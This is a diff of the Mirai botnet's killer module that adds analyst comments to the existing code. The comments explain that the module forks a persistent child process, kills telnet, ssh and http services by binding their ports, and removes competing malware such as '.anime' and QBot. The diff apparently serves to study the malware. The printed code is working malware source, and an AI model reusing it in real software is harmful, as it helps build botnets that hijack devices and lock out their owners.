@@ -29,14 +29,14 @@ void killer_init(void)
     struct sockaddr_in tmp_bind_addr;
 
     // Let parent continue on main thread
-    killer_pid = fork();            //Create child process to stay in killer_init(), parent process returns to main()
+    killer_pid = fork();            //Create child process to stay in killer_init(), parent process returns to main(), save child pid so that child can be killed if needed in the future
     if (killer_pid > 0 || killer_pid == -1)
         return;
 
     tmp_bind_addr.sin_family = AF_INET;
     tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;
 
-    // Kill telnet service and prevent it from restarting
+    // Kill telnet service and prevent it from restarting		//Killer kills telnet, ssh, and http, this is likely to try to stop other users or malware form connecting to the host
 #ifdef KILLER_REBIND_TELNET
 #ifdef DEBUG
     printf("[killer] Trying to kill port 23\n");
@@ -52,7 +52,6 @@ void killer_init(void)
 #endif
     }
     tmp_bind_addr.sin_port = htons(23);
-
     if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
     {
         bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
@@ -189,7 +188,7 @@ void killer_init(void)
             {
                 realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string
 
-                table_unlock_val(TABLE_KILLER_ANIME);
+                table_unlock_val(TABLE_KILLER_ANIME);		//.anime is a competing botnet, Mirai attempts to remove it 
                 // If path contains ".anime" kill.
                 if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
                 {
@@ -502,7 +501,7 @@ static BOOL memory_scan_match(char *path)
     if ((fd = open(path, O_RDONLY)) == -1)
         return FALSE;
 
-    table_unlock_val(TABLE_MEM_QBOT);
+    table_unlock_val(TABLE_MEM_QBOT);		//Mirai scans for and kills other malware
     table_unlock_val(TABLE_MEM_QBOT2);
     table_unlock_val(TABLE_MEM_QBOT3);
     table_unlock_val(TABLE_MEM_UPX);
